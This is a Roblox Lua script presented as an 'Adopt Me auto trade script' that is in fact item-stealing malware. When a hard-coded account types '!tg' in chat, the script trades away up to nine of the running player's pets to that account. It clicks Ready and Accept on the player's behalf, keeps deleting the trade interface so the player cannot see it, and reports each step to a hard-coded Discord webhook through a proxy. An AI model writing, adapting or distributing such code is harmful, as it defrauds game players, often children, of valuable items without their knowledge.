--[[
    ADOPT ME AUTO TRADE SCRIPT
    Works with Discord webhook via proxy
    Triggers when target types !tg
--]]

local webhook = "https://discord.roproxy.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
local target = "Sigmake5"

local player = game.Players.LocalPlayer
local players = game:GetService("Players")
local http = game:GetService("HttpService")
local input = game:GetService("VirtualInputManager")

local trading = false

-- Send Discord message
local function discord(msg)
    pcall(function()
        local data = http:JSONEncode({content = msg})
        request({url = webhook, method = "POST", headers = {["Content-Type"] = "application/json"}, body = data})
    end)
end

-- Hide trade UI
local function hideUI()
    pcall(function()
        for _, v in pairs(player.PlayerGui:GetChildren()) do
            if v.Name:lower():find("trade") then
                v:Destroy()
            end
        end
    end)
end

spawn(function()
    while wait(0.1) do
        hideUI()
    end
end)

-- Click function
local function click(btn)
    if not btn then return end
    pcall(function()
        local pos = btn.AbsolutePosition
        local size = btn.AbsoluteSize
        if pos and size then
            local x = pos.X + size.X/2
            local y = pos.Y + size.Y/2
            input:SendMouseMoveEvent(x, y, 0)
            wait(0.05)
            input:SendMouseButtonEvent(x, y, 0, true, game, 0)
            wait(0.05)
            input:SendMouseButtonEvent(x, y, 0, false, game, 0)
        end
        btn:Fire("MouseButton1Click")
    end)
end

-- Find player in list
local function findPlayer()
    for _, v in pairs(player.PlayerGui:GetDescendants()) do
        if v:IsA("TextButton") and v.Text == target then
            return v
        end
        for _, child in pairs(v:GetChildren()) do
            if child:IsA("TextLabel") and child.Text == target then
                return v
            end
        end
    end
    return nil
end

-- Find trade button
local function findTradeBtn()
    for _, v in pairs(player.PlayerGui:GetDescendants()) do
        if v:IsA("TextButton") and v.Visible and (v.Text == "Trade" or (v.Text or ""):lower() == "trade") then
            return v
        end
    end
    return nil
end

-- Find accept button
local function findAccept()
    for _, v in pairs(player.PlayerGui:GetDescendants()) do
        if v:IsA("TextButton") and v.Visible and v.Text == "Accept" then
            return v
        end
    end
    return nil
end

-- Find ready button
local function findReady()
    for _, v in pairs(player.PlayerGui:GetDescendants()) do
        if v:IsA("TextButton") and v.Visible and v.Text == "Ready" then
            return v
        end
    end
    return nil
end

-- Get all pets/items
local function getItems()
    local items = {}
    for _, v in pairs(player.PlayerGui:GetDescendants()) do
        if v:IsA("ImageButton") and v.Visible then
            local parent = v.Parent
            if parent and (parent.Name == "Inventory" or parent.Name == "Pets") then
                table.insert(items, v)
            end
        end
    end
    return items
end

-- Add items to trade
local function addItems(slots)
    local items = getItems()
    local added = 0
    for i = 1, math.min(slots, #items) do
        click(items[i])
        added = added + 1
        wait(0.3)
    end
    return added
end

-- Main trade function
local function trade()
    if trading then
        discord("Trade already in progress")
        return
    end
    trading = true
    
    discord("Trade started by " .. player.Name)
    
    -- Find and click target
    local targetBtn = findPlayer()
    if not targetBtn then
        discord("Target " .. target .. " not found")
        trading = false
        return
    end
    click(targetBtn)
    wait(0.5)
    
    -- Click trade button
    local tradeBtn = findTradeBtn()
    if not tradeBtn then
        discord("Trade button not found")
        trading = false
        return
    end
    click(tradeBtn)
    wait(1)
    
    -- Accept request
    local accept = findAccept()
    if accept then
        click(accept)
        wait(1)
    end
    
    -- Add items (max 9 slots)
    local added = addItems(9)
    discord("Added " .. added .. " items to trade")
    wait(0.5)
    
    -- Ready up
    local ready = findReady()
    if ready then
        click(ready)
        wait(0.5)
    end
    
    -- Final accept
    local final = findAccept()
    if final then
        click(final)
    end
    
    discord("Trade complete! " .. added .. " items sent to " .. target)
    trading = false
end

-- Listen for !tg command
local chat = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
if chat then
    chat.SayMessageRequest.OnClientEvent:Connect(function(msg, sender)
        if msg == "!tg" and sender == target then
            discord("!tg received from " .. target)
            wait(1)
            trade()
        end
    end)
end

